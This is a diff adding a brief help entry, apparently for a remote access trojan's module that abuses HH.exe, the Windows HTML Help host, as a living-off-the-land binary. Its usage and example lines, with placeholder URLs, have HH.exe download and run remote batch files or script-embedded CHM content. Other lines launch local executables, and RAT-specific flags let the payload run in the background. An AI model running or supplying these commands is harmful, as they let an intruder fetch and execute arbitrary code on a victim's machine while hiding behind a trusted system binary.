@@ -1,0 +1,21 @@
+ABOUT
+    HTML Help (.chm) host. LOLBAS opens remote batch files, runs
+    local executables, or loads remote CHM content that embeds
+    script for download and execution.
+
+USAGE:
+    HH.exe {REMOTEURL:.bat}
+    HH.exe {PATH_ABSOLUTE:.exe}
+    HH.exe {REMOTEURL:.chm}
+
+EXAMPLES:
+    HH.exe {REMOTEURL:.bat}
+    HH.exe {PATH_ABSOLUTE:.exe}
+    HH.exe {REMOTEURL:.chm}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    HH.exe {REMOTEURL:.bat}
